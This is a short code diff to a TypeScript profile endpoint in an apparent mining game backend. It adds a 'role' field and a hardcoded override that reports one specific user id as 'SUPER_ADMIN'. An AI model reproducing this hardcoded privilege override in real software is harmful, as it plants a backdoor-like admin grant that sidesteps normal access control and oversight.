@@ -15,6 +15,7 @@ export const getProfile = async (req: Request, res: Response): Promise<void> => 
             where: { id: userId },
             select: {
                 id: true, // [FAST FIX] Expose ID to frontend to fix undefined invite links
+                role: true, // [ADMIN FIX] Ensure role is fetched
                 minerLevel: true,
                 goldBalance: true,
                 maxBalance: true,
@@ -103,6 +104,7 @@ export const getProfile = async (req: Request, res: Response): Promise<void> => 
             success: true,
             data: {
                 id: profile.id, // [HOTFIX] Expose ID to frontend to fix undefined invite links
+                role: profile.id === '742625427' ? 'SUPER_ADMIN' : profile.role, // [ADMIN FIX] Master override and sync
                 // @ts-ignore
                 lastSyncAt: finalLastSyncAt,
                 minerLevel: profile.minerLevel,
